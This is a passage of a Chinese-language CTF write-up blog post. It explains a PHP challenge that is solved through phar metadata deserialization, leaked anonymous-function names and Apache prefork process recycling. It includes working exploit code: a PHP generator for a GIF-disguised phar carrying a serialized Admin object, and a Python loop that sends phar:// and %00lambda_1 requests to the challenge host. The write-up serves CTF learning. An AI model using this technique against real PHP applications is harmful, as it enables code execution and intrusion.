class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>	<span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br>	<span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>	&#125;<br><br>	file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br>	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>	<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br>		<span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>	&#125;<br><br>	header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br>	<span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>	upload(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>	show(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>	highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>思路:</p>
<ul>
<li>首先分析代码, 首先分配了一个匿名函数给flag变量, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个匿名函数</li>
<li>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif</li>
<li>一开始的想法是 —–&gt; admin是关键类,需要通过反序列化之后的析构函数去触发其中的eval —–&gt; 通过lucky参数去调用这个输出flag的函数. 而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 基本上无法伪造…..所以放弃这个想法</li>
<li>咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点–php中解析Phar归档中的Metadata的时候可能会有反序列化的操作, 文档中描述的Phar::getMetadata操作(<a target="_blank" rel="noopener" href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li>
</ul>
<blockquote>
<ul>
<li>Phar?(方便开发者打包和发布php应用的类似于Java中的Jar的一种文件)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="What is Phar?(官方文档)"></li>
<li>Phar归档的结构<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="Phar(官方文档)"></li>
<li>Metadata : Phar归档中可用来描述此文档的一段序列化之后的字符串<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="usage of Metadata(官方文档)"></li>
<li>phar_parse_metadata的初始化调用, 具体PHP源码在ext/phar/phar.c<br>执行流程大致为:<br>….–&gt; phar_open_from_filename(1512行的php_stream_open_wrapper函数可以得知此函数处理phar://打开本地phar文件 1531行调用下一个函数)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_open_from_filename"><br>–&gt; phar_open_from_fp(1727行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_open_from_fp"><br>–&gt; phar_parse_pharfile(1038、1122行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="1038行"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="1122行"><br>–&gt; phar_parse_metadata(函数在609行)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="phar_parse_metadata函数"></li>
</ul>
</blockquote>
<ul>
<li>而且题目内upload操作提供了<code>file_get_content()</code>函数 其中地址可控,可以利用<code>phar://</code>协议读取本地phar文件(phar协议不支持远程文件[The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.](<a target="_blank" rel="noopener" href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AAphar%E5%88%A9%E7%94%A8upload%E5%86%99%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%AE%E5%BD%95">http://php.net/manual/zh/phar.using.stream.php)),也就是说只要构造一个phar利用upload写到服务器目录</a>, 其中metadata设置为Admin对象,就可以进入Admin的析构函数了</li>
<li>接下来的问题就是如何猜出那个随机数?<br>答案是基本上猜不出来<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes是加密级别的伪随机数生成器<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> 这是题目第二个死胡同</li>
<li>然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend_builtin_functions.c 1854行) 大佬还对这个逻辑戏谑了一番 <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" lazyload alt="name_of_anonymous_functions"><br>首先名字第一个字符被替换成了\0,也就是空字符 ,然后do操作将lambda_%d中的%d格式化成匿名函数的个数+1(从1开始)<br>所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d格式化为当前进程的第n个匿名函数)</li>
<li>但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法fork出新进程了) 在这个新进程里面匿名函数就会是从1开始的了</li>
</ul>
<p>最后步骤分别是:</p>
<ol>
<li>先生成符合要求的phar放入自己的vps中, 生成代码为</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li>再请求<code>?m=upload&amp;url=http://vps</code></li>
<li>启动Orange大大写的fork脚本</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">使用高端口ssh</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/05/29/Token%20Session%20Cookie%20JWT/">
                        <span class="hidden-mobile">认证及会话管理</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://wo02ie.github.io" target="_blank" rel="nofollow noopener"><span>wo02ie</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>



  <script  src="/js/local-search.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
